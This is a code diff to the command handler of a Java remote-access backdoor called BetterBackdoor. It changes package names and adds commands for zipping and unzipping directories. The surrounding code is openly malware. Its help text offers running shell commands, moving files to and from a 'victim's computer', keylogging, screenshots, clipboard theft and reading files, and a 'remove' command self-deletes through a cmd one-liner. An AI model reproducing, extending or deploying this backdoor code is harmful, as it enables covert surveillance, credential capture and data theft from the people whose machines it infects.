@@ -1,4 +1,4 @@
-package com.github.thatcherdev.betterbackdoor.backdoor;
+package com.thatcherdev.betterbackdoor.backdoor;
 
 import java.util.Scanner;
 import java.awt.datatransfer.DataFlavor;
@@ -10,10 +10,10 @@ import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
 import javax.imageio.ImageIO;
-import com.github.thatcherdev.betterbackdoor.backend.DuckyScripts;
-import com.github.thatcherdev.betterbackdoor.backend.FTP;
-import com.github.thatcherdev.betterbackdoor.backend.KeyLogger;
-import com.github.thatcherdev.betterbackdoor.backend.Utils;
+import com.thatcherdev.betterbackdoor.backend.DuckyScripts;
+import com.thatcherdev.betterbackdoor.backend.FTP;
+import com.thatcherdev.betterbackdoor.backend.KeyLogger;
+import com.thatcherdev.betterbackdoor.backend.Utils;
 import org.apache.commons.io.FileUtils;
 
 public class HandleCommand {
@@ -35,6 +35,7 @@ public class HandleCommand {
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
 					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
 					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
+					+ "[zip] Compress a directory to a ZIP file\n[unzip] Decompress a ZIP file\n"
 					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit";
 		else if (command.startsWith("cmd"))
 			send = Utils.runCommand(command.substring(4));
@@ -150,7 +151,28 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		else if (command.equals("remove"))
+		else if (command.startsWith("zip")) {
+			try {
+				File dir = new File(command.substring(4));
+				if (!dir.isDirectory())
+					throw new Exception("Not a directory");
+				Utils.zipDir(dir.getAbsolutePath());
+				send = "Directory compressed to '" + dir.getAbsolutePath() + ".zip'";
+			} catch (Exception e) {
+				send = "An error occurred when compressing directory";
+				if (e.getMessage() != null)
+					send += ":\n" + e.getMessage();
+			}
+		} else if (command.startsWith("unzip")) {
+			try {
+				String output = Utils.unzip(command.substring(6));
+				send = "Contents of ZIP file decompressed to '" + output + "'";
+			} catch (Exception e) {
+				send = "An error occurred when decompressing directory";
+				if (e.getMessage() != null)
+					send += ":\n" + e.getMessage();
+			}
+		} else if (command.equals("remove"))
 			try {
 				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
 						+ Backdoor.gatheredDir + " jre");
